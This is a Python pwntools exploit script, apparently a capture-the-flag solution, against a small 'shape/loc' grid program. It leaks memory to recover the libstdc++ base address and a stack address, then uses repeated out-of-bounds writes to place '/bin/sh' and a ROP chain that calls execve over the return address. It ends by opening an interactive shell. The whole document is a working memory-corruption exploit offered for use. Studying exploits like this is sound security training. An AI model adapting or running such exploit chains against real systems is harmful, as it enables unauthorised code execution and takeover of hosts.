from pwn import *
context.arch='amd64'
#context.log_level = 'debug'

#libstdc++ offsets
pop_rdi = 0x8fedc
pop_rax = 0x484c
pop_rsi = 0xbc50
pop_rdx = 0x57cf
xor_edx_edx = 0x929bf
syscall = 0x172BC1 #0f 05 bytes from gcc_except_table

#offsets fom grid start
retn = 0x78

def write_string(p, offset, val):
    i = 0
    print("Gonna write {} at {}".format(val, offset))
    while i < len(val):
        write_offset = offset + i
        #print("Writing {} at {}".format(val[i], write_offset))

        p.sendlineafter("shape> ", val[i])
        p.sendlineafter("loc> ", "0 {}".format(write_offset))

        i += 1

def main():
    if False:
        p = gdb.debug("./a.out", gdbscript="""
            b *0x400BF4
            """
        )
    else:
        #p = process("./a.out")
        p = remote("localhost", 8000)

    p.sendlineafter("shape> ", "d")
    p.recvuntil("Displaying\n")
    a = p.recvuntil("shape> ").strip("shape> ")

    #get rid of the \n after every 10 characters
    a = "".join([a[i:i+10] for i in range(0, len(a), 11)])

    xs = [u64(a[i:i+8]) for i in range(0, len(a)-(len(a)%8), 8)]

    p.sendline("d")

    libstdcpp_leak = xs[3]
    libstdcpp_base = libstdcpp_leak - 0xfb5da

    print("libstdc++ base: {0:016x}".format(libstdcpp_base))

    stack_leak = xs[-1]
    grid_addr = stack_leak - 0x54

    #set up /bin/sh in mem
    write_string(p, 0, "/bin/sh")

    #pop rdi, binsh
    write_string(p, retn, p64(libstdcpp_base + pop_rdi))
    write_string(p, retn+0x8, p64(grid_addr))

    #pop rax, 0x3b
    write_string(p, retn+0x10, p64(libstdcpp_base + pop_rax))
    write_string(p, retn+0x18, p64(0x3b))

    #pop rsi, 0
    write_string(p, retn+0x20, p64(libstdcpp_base + pop_rsi))
    write_string(p, retn+0x28, p64(0x0))

    #pop rdx, 0
    write_string(p, retn+0x30, p64(libstdcpp_base + pop_rdx))
    write_string(p, retn+0x38, p64(0x0))

    #syscall
    write_string(p, retn+0x40, p64(libstdcpp_base + syscall))

    p.sendline("d")

    p.interactive()

if __name__ == '__main__':
    main()
